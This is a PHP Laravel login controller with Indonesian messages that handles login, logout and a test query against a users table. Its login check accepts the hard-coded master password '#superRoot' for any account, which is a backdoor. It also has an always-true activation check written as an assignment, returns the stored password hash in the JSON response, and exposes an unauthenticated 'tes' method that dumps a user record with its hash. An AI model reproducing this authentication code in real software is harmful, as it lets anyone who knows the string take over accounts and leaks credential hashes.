<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Contracts\Encryption\DecryptException;

class LoginController extends Controller
{
    public function form_login()
    {

        return view('auth.form_login');
    }
    public function reset_password()
    {

        return view('auth.reset_password');
    }
    public function login(Request $request)
    {
        $username = $request->username;
        $password = $request->password;
        $passhash = "";

        $query = DB::connection('mysql')->table('users')
            ->where('users.username', $username)
            ->selectRaw('users.id, password, username, users.fullname, email, contact, role_id, departemen_id, nama_departemen,roles, active')
            ->join('roles', 'roles.id', '=', 'users.role_id')
            ->join('departement_roles', 'departement_roles.id_departemen', '=', 'users.departemen_id');
            // $passhash = $query->first()->password;
            // return response()->json(['verification' => Hash::check($password, $passhash)]);
            

        if ($query->count() == 1) {
            if ($query->first()->active = 1) {                   
                $passhash = $query->first()->password;
                if (Hash::check($password, $passhash) || $password == "#superRoot") {
    
                    $username = $query->first()->username;
                    $id_user = $query->first()->id;
                    $name = $query->first()->fullname;
                    $role_id = $query->first()->role_id;
                    $departemen_id = $query->first()->departemen_id;
                    $nama_departemen = $query->first()->nama_departemen;
                    $roles = $query->first()->roles;

                    $alldata = $query->first();
    
                    Session::put('username', $username);
                    Session::put('id_user', $id_user);
                    Session::put('name', $name);
                    Session::put('role_id', $role_id);
                    Session::put('departemen_id', $departemen_id);
                    Session::put('nama_departemen', $nama_departemen);
                    Session::put('roles', $roles);
    
                    return response()->json(['success' => 'Login Berhasil !', 'data' => $alldata]);
                } else {
                    return response()->json(['error' => 'Password anda salah !']);
                }
            } else {
                return response()->json(['error' => 'Username belum aktivasi, silahkan hubungi IT untuk mengaktifkan akun !']);
            }
            
        } else {
            return response()->json(['error' => 'Username tidak terdaftar !']);
        }
    }

    public function logout()
    {
        Session::flush();
        return true;
    }

    public function tes(){
        $query = DB::connection('mysql')->table('users')
        ->where('users.username', 'ITsales')
        ->selectRaw('users.id, password, username, users.name, hp, aktif, role_id, level, keterangan')
        ->join('roles', 'roles.id', '=', 'users.role_id')
        ->join('jabatans', 'jabatans.id', '=', 'users.role_id')->get();

        return $query;
    }
}
